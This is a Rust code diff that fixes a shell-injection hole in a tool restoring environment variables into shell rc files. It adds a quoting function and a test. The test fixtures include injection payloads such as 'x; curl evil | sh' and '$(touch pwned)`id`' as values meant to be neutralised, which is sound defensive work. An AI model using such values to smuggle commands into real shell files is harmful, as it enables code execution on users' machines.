@@ -244,6 +244,21 @@ fn validate_conflict(conflict: &EnvConflict, rc_files: &[String]) -> Result<(), 
     Ok(())
 }
 
+/// Quote a value for an `export NAME=VALUE` line so it can never run shell code.
+///
+/// Values made only of characters that are inert in POSIX shells are written as-is
+/// (unchanged output for typical keys and URLs); anything else (`;`, `$(...)`, backticks,
+/// `&`, spaces, quotes, ...) is single-quoted, escaping embedded `'` as `'\''`.
+#[cfg(not(target_os = "windows"))]
+fn shell_quote_value(value: &str) -> String {
+    let is_inert = |c: char| c.is_ascii_alphanumeric() || "_-.,:/@%+=~^".contains(c);
+    if !value.is_empty() && value.chars().all(is_inert) {
+        value.to_string()
+    } else {
+        format!("'{}'", value.replace('\'', "'\\''"))
+    }
+}
+
 /// Restore a single environment variable
 #[cfg(target_os = "windows")]
 fn restore_single_env(conflict: &EnvConflict) -> Result<(), String> {
@@ -292,7 +307,11 @@ fn restore_single_env(conflict: &EnvConflict) -> Result<(), String> {
                 .map_err(|e| format!("读取文件失败 {file_path}: {e}"))?;
 
             // Append the environment variable line
-            let export_line = format!("\nexport {}={}", conflict.var_name, conflict.var_value);
+            let export_line = format!(
+                "\nexport {}={}",
+                conflict.var_name,
+                shell_quote_value(&conflict.var_value)
+            );
             content.push_str(&export_line);
 
             // Write back to file
@@ -423,6 +442,36 @@ mod tests {
         assert_eq!(
             fs::read_to_string(&rc).unwrap(),
             "# rc\nexport ANTHROPIC_BASE_URL=https://example.com"
+        );
+    }
+
+    #[cfg(not(target_os = "windows"))]
+    #[test]
+    fn restore_quotes_values_that_would_run_shell_code() {
+        let temp = tempfile::TempDir::new().unwrap();
+        let backup_dir = temp.path().join("backups");
+        let rc = temp.path().join(".zshrc");
+        fs::write(&rc, "# rc").unwrap();
+        let backup = write_backup(
+            &backup_dir,
+            "env-backup-20260101_000000.json",
+            vec![
+                file_conflict(&rc, "ANTHROPIC_A", "x; curl evil | sh"),
+                file_conflict(&rc, "ANTHROPIC_B", "$(touch pwned)`id`"),
+                file_conflict(&rc, "ANTHROPIC_C", "it's"),
+                file_conflict(&rc, "ANTHROPIC_D", "https://h/p?a=1&b=2"),
+            ],
+        );
+        let rc_files = vec![rc.to_string_lossy().to_string()];
+
+        restore_from_backup_in(&backup.to_string_lossy(), &backup_dir, &rc_files).unwrap();
+        assert_eq!(
+            fs::read_to_string(&rc).unwrap(),
+            "# rc\n\
+             export ANTHROPIC_A='x; curl evil | sh'\n\
+             export ANTHROPIC_B='$(touch pwned)`id`'\n\
+             export ANTHROPIC_C='it'\\''s'\n\
+             export ANTHROPIC_D='https://h/p?a=1&b=2'"
         );
     }
 
